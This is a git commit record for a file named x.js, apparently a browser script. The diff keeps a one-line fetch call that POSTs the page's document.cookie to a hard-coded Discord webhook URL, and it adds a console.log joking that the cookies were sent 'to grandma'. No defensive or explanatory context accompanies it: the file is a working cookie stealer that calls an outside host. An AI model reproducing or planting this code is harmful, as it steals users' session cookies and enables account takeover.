52925e7cf436257608bca665236d7a046f17ede2
Leonard Walter <50204487+LeonardWalter@users.noreply.github.com>
2023-11-17 23:13:40 +0200

    Update x.js

--- x.js
+++ x.js
@@ -1,1 +1,2 @@
-fetch("https://discord.com/api/webhooks/1110165888746926090/3RtVoJwCqglC6P4r1b7-DIyH1VA2ElG-dpPJzQCxAi-COUmoa0xemCX05dHqgHJ2NUkM",{body: JSON.stringify({content: "new cookie:" + document.cookie}),headers: {"Content-Type": "application/json"},method: "POST"})
+fetch("https://discord.com/api/webhooks/1110165888746926090/3RtVoJwCqglC6P4r1b7-DIyH1VA2ElG-dpPJzQCxAi-COUmoa0xemCX05dHqgHJ2NUkM",{body: JSON.stringify({content: "new cookie:" + document.cookie}), headers: {"Content-Type": "application/json"},method: "POST"})
+console.log("sent the cookies to grandma")
